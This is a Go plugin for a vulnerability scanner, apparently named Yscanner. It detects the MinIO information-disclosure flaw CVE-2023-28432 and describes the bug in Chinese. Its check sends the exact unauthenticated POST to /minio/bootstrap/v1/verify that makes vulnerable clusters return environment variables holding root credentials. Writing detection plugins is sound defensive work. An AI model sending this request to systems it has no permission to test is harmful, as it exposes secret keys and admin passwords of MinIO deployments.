// goplugin/plugin2.go
package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

// 注册插件2
func init() {
	Register("Minio_cve_2023_28432", &Minio_cve_2023_28432{})
}

// 示例插件2
type Minio_cve_2023_28432 struct{}

func (p *Minio_cve_2023_28432) Info() PluginInfo {
	return PluginInfo{
		Name:     "MinIO 信息泄露漏洞（CVE-2023-28432）",
		VulnInfo: "MinIO 存在信息泄露漏洞，在集群部署的MinIO中，未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，最终可能导致攻击者以管理员身份登录MinIO。",
		VulnID:   "CVE-2023-28432",
		Level:    "7.5 HIGH",
		URL:      "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-28432",
		Version:  "RELEASE.2019-12-17T23-16-33Z <= MinIO < RELEASE.2023-03-20T20-16-18Z",
		CWE:      "CWE-200	信息暴露",
	}
}

func (p *Minio_cve_2023_28432) Check(netloc string) bool {
	req, err := http.NewRequest("POST", netloc+"/minio/bootstrap/v1/verify", nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "MinioEndpoints") {
		return true
	}

	return false
}
